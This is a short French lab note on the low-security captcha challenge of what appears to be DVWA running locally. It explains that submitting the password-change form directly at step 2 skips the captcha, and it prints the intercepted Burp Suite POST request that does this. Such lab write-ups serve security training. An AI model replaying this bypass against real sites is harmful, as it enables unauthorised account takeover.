# Captcha low

- formulaire qui permet de charger le mot de passe de l'administrateur
- exactement le même cas que celui présenté pour le CSRF
- MAIS il y a ici en + le champ Captcha


étape 1 

formulaire 
    password
    password confirm
    captcha

étape 2
    ici des champs hidden `<input type="hidden">`
    bouton confirm

étape 3
    message qui dit ok le mot de passe vient de changer 

Via la burp suite je vais intercepter le soumission du formulaire à l'étape 2


POST /vulnerabilities/captcha/ HTTP/1.1
Host: 127.0.0.1:4280
Content-Length: 57
Cache-Control: max-age=0
sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: fr-FR,fr;q=0.9
Origin: http://127.0.0.1:4280
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:4280/vulnerabilities/captcha/
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=b6e48374eeed562a56a7d482084eb8cf; security=low
Connection: keep-alive

step=2&password_new=titi&password_conf=titi&Change=Change